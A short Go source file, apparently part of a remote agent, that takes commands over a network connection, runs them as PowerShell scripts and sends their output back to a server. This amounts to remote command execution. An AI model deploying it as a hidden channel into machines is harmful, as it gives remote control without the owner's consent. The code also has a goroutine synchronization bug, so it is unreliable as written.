package main

import (
	"context"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
)

type Command struct {
	Name string
	Args []string
}

func HandleCommand(command Command, conn net.Conn) {
	log.Printf("Received command %s\n", command.Name)

	switch command.Name {
	case "ps":
		go execPs(strings.Join(command.Args[0:], " "), conn)
	}
}

func handleCommandContext(name, args string, conn net.Conn) {
	cmdCtx, cmdCancel := context.WithCancel(context.Background())

	cmd := exec.CommandContext(cmdCtx, name, args)
	cmd.SysProcAttr = &syscall.SysProcAttr{}

	outputPipe, err := cmd.StdoutPipe()
	if err != nil {
		log.Println(err)
	}

	err = cmd.Start()
	if err != nil {
		log.Println(err)
	}

	var wg sync.WaitGroup
	go func() {
		wg.Add(1)
		defer wg.Done()

		output, err := ioutil.ReadAll(outputPipe)
		if err != nil {
			log.Println(err)
		}

		if len(output) > 0 {
			processCommandOutput(string(output), conn)
		}

		waitError := cmd.Wait()
		if waitError != nil {
			log.Println(waitError)
		}
	}()

	interruptChannel := make(chan os.Signal, 1)
	signal.Notify(interruptChannel, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-interruptChannel
		log.Println("Received an interrupt signal. Stopping the command...")
		cmdCancel()
	}()

	wg.Wait()
}

func processCommandOutput(output string, conn net.Conn) {
	log.Printf("PowerShell command output: %s\n", output)

	sendOutputToServer(output, conn)
}

func execPs(script string, conn net.Conn) {
	log.Printf("Executing script %s\n", script)

	go handleCommandContext("powershell", script, conn)
}
